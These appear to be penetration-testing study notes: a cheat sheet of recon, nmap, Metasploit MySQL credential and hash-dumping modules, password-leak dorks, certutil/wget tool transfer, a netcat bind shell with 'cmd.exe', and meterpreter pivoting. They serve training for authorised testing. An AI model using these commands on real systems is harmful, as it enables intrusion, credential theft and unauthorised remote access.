
					**Information Gathering**

**Website Recon & Footprinting**
- whatis host
- whatweb domain
- host domain (give us the ip)

**Whois Enumeration**
- whois domain or ip

**DNS Recon**
- dnsrecon  -d domain
- dnsdumpster (website, passive) 


**WAF Detection With wafw00f**
- wafw00f domain

**Subdomain Enumeration With Sublist3r**
- sublist3r -d domain -e name_website(google or sth else)

**Google Dorks**
- site:ine.com (to specific the domain and give the limit result)
- site:ine.com inurl:admin (to specific what you want)
- site:* .ine.com (enumerate subdomain using google by using *.) (no spcae after *)
- cach:ine.com (to look for the old version of the website)
- inurl:auth_user_file.txt or password.txt(to find the leak password of the user on the internet)
- filetype:pdf
- intitle:admin


						**FootPrinting & Scanning**


**Nmap**
- -Pn : do not check that this host is online just perform a port scan, avoid ping.
- -p- : scan all port 1-65535
- -p 80,455,22 : specify port
- -p1-1000 : specify the range port
- -F : fast scan, which will only scan 100 port most commonly used
- -sU : perform a udp scan, because nmap default perform tcp scan (-sT)
- -v : verbose, want to know the background of nmap doing
- -sV : service scan (show version)
- -O : detect the operating system
- -sC : default nmap script
- -A : includes such as -sV, -O, -sC
- -T : to speed up your scan, that are 5 options, 0 (paranoid), 1 (sneaky), 2 (polite), 3 (normal), 4 (aggressive), 5 (insane)
- -oN : save nmap result to specific file
- -sn: find host online usually use with the range of the network
- -PE: ICMP ping scan
- -sS: Sync Scan
- -f: splitting large packet sinto smaller fragment
- --scan-delay: delay Example: --scan-delay 5s
- --script=banner (look in detail)
- --script=mongodb-info: mongodb database
- --script smb-protocols: to list the supported protocols and dialects of an SMB server
- --script smb-security-mode: to return the information about the SMB security level
- --script smb-enum-sessions: enumerating the users logged into a system through an SMB share 
- --script smb-enum-shares: enumerating all available shares

**Host Discovery With Nmap**
- sudo netdiscover -i eth0 -r 192.168.2.0/24

**Port Scanning**(Nmap)

	**Metasploit-framework**
	- auxiliary/scanner/portscan/tcp
	
	**Route to another ip range that have been found**
	- run autoroute -s ip (private ip of another victim machine) (in meterpreter>)
	- background

**MySQL** 

	**Metasploit-framework**
	- auxiliary/scanner/mysql/mysql_version (show the version)
	- auxiliary/scanner/portscan/tcp (just to confirm the port of mysql running)
	- auxiliary/scanner/mysql/mysql_login (USERNAME: root, PASS_FILE: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt)
	- auxiliary/admin/mysql/mysql_enum (show credentials like hash of admin or local user)
	- auxiliary/admin/mysql/mysql_sql (show the database and table)
	- auxiliary/scanner/mysql/mysql_schemadump (display the table in the database)
	- auxiliary/scanner/mysql/mysql_file_enum
	- auxiliary/scanner/mysql/mysql_hashdump
	- auxiliary/scanner/mysql/mysql_writable_dirs

	**Login**
	-mysql -h domain or ip -u user -p
	- mysql -h domain -u root --skip-ssl (login use root without password and skip ssl from error)

	**Change phpmyadmin.conf**
	-download it from meterpreter to own kali
	-change allow to all
	-upload phpmyadmin.conft (in meterpreter)
	-net stop wampapache
	-net start wampapache
	-we can access to the db through the webpage in firefox


**Postgresql**
- service postgresql start (start the database)
- msfconsole
- db_status (connect to the database)
- db_import file (import file from our local file to database)
- hosts
- services

**Leaked Password with Database**
- haveibeenpwn (website)

 **The harvester**
- theHarvester -d domain -b public_domain (like google, yahoo)

**DNS Zone Transfer**
- dnsenum domain
- dig axfr @server domain
- fierce -dns domian (bruteforce)

**Netcat**
- nc ip port 
- nc -nv ip port (to check it successful connect to that port or not)
- nc -nvu ip port (same as above but it connect to udp port)

**Public Exploits**
- exploitdb
- rapid7

**SearchSploit**
- searchsploit -m unique_db_name => copy to current directory

**Host Server**
- cd /usr/share/windows-binaries
- python3 -m http.server 80 or python -m SimpleHTTPServer 80

**Transfer File**

	**Kali Machine**
	-python3 -m http.server 80 (need to cd to the directory that has a tool)

	**Window Machine**
	- certutil -urlcache -f http://ip/file_name file_name 

	**Linux Machine**
	- wget http://ip/file_name

**BindShell**

	**In target machine**
	- access web browser in target machine using attacker machine
	- nc.exe -nvlp 1234 -e cmd.exe

	**In attacker machine**
	-nc -nv target_ip 1234

**ReverseShell**
- Reverse Shell Generator (website)
- GTFOBins (website)

**Pivot**
- run autoroute -s 10.0.29.0/20 (run in meterpreter)
- run autoroute -p (list)
- background
- auxiliary/scanner/portscan/tcp
- portfwd add -l 1234(local port) -p 80(open port in victimmachine) -r victimmachine_ip (run in meterpreter)
- nmap -sV -p 1234 localhost